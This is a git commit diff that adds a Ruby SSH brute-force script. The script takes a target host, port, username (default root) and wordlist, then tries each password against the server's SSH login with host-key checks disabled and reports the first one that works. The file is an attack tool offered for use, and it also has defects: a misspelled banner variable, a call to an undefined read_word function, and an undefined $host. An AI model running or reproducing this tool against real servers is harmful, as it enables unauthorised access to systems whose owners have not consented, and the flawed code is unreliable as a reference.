2c0c7d29c3a786c2857e3d18314f729d7a76aeaf
krishpranav <krisna.pranav@gmail.com>
2021-04-11 01:20:51 -0400

    done changes

--- ssh_bruteforcer.rb
+++ ssh_bruteforcer.rb
@@ -1,18 +1,43 @@
-#!/usr/bin/env/ruby
-require 'net-ssh'
+#!/bin/ruby
 require 'slop'
-$banner=" SSH BRUTE FORCER"
+require 'net/ssh'
+$banenr="SSH BRUTE FORCER"
 
 def parse()
-    $options = Slop.parse suppress_errors: true do |argument|
-     argument.string 'host', 'IP of server(default-localhost)',required:true
-     argument.integer '-p','--port', 'Custom port', default: 22
-     argument.string '-u', '--user', 'Username(default-root)',default: 'root', required:true
-     argument.string '-w','--wordlist','Path to wordlist(default-john dictionary)',default: "dic/john.txt"
-     argument.bool '-v', '--verbose', 'Enable verbose', default: false
-     argument.on '--help' do 
-      print (argument)
-      exit()
-     end
+ $options = Slop.parse suppress_errors: true do |argument|
+  argument.string 'host', 'IP of server(default-localhost)',required:true
+  argument.integer '-p','--port', 'Custom port', default: 22
+  argument.string '-u', '--user', 'Username(default-root)',default: 'root', required:true
+  argument.string '-w','--wordlist','Path to wordlist(default-john dictionary)',default: "dic/john.txt"
+  argument.bool '-v', '--verbose', 'Enable verbose', default: false
+  argument.on '--help' do 
+   print (argument)
+   exit()
+  end
+ end
+end
+def main()
+ print($banner)
+ parse()
+ read_word()
+ crack()
+end
+def crack()
+ File.open($options[:wordlist],'r') do |wordlist_file|
+  wordlist_file.each do |passwd|
+   begin
+    Net::SSH.start($options[:host],$options[:user],:password=>passwd.strip(),:auth_methods => ["password"],:port => $options[:port],:verify_host_key => :never, :non_interactive => true) do |ssh|
+     print("\nFound password:#{passwd}")
+     exit()
     end
-   end
+   rescue Net::SSH::Authentication::DisallowedMethod
+    print("\nError(Password authentication isn't allowed on #{$host})")
+    exit()
+   rescue Net::SSH::AuthenticationFailed
+    print("\nWrong password:#{passwd}") if $options.verbose?
+   end 
+  end
+  print("\nPassword isn't found")
+  exit()
+ end
+end
